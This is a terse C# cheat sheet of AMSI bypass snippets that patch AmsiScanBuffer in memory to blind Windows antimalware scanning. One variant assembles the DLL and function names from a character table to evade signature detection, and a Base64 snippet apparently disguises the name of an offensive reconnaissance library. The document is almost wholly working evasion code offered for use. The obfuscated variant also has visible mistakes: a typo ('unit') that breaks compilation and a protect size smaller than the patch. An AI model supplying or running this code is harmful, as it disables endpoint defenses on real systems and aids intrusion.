- AMSI patch bypass
```C#
var amsiDll = LoadLibrary("amsi.dll");
var asbAddress = GetProcAddress(amsiDll, "AmsiScanBuffer");
		
var ret = new byte[] { 0xC3 };
VirtualProtect(asbAddress, (UIntPtr)ret.Length, 0x40, out uint oldProtect);
Marshal.Copy(ret, 0, asbAddress, ret.Length);
VirtualProtect(asbAddress, (UIntPtr)ret.Length, oldProtect, out uint _);
```

```C#
public static string AllChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890.{}[]#';/=-+_";        
	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string name);

	[DllImport("kernel32")]
	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
	static int DefendMe()
	{

		IntPtr Address = GetProcAddress(LoadLibrary(string.Join("", new char[]{
			AllChars.ToCharArray()[0],
			AllChars.ToCharArray()[12],
			AllChars.ToCharArray()[18],
			AllChars.ToCharArray()[8],
			AllChars.ToCharArray()[62],
			AllChars.ToCharArray()[3],
			AllChars.ToCharArray()[11],
			AllChars.ToCharArray()[11],
		})), string.Join("", new char[]{
			AllChars.ToCharArray()[26], 
			AllChars.ToCharArray()[12],
			AllChars.ToCharArray()[18],
			AllChars.ToCharArray()[8],
			AllChars.ToCharArray()[44],
			AllChars.ToCharArray()[2],
			AllChars.ToCharArray()[0],
			AllChars.ToCharArray()[13],
			AllChars.ToCharArray()[27],
			AllChars.ToCharArray()[20],
			AllChars.ToCharArray()[5],
			AllChars.ToCharArray()[5],
			AllChars.ToCharArray()[4],
			AllChars.ToCharArray()[17]
		}));

		UIntPtr size = (UIntPtr)5;
		uint p = 0;

		VirtualProtect(Address, size, 0x40, out p);
		Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
		Marshal.Copy(Patch, 0, Address, 6);
		VirtualProtect(Address, size, p, out unit _));
		return 0;

	}
```

- Base64 encoding and decoding a string
```C#
Console.WriteLine(Convert.ToBase64String(Encoding.UTF8.GetBytes("SharpHoundCommonLib")));            Console.WriteLine(Encoding.UTF8.GetString(Convert.FromBase64String("Q3RodWxodSBmaHRhZ24h")));
```

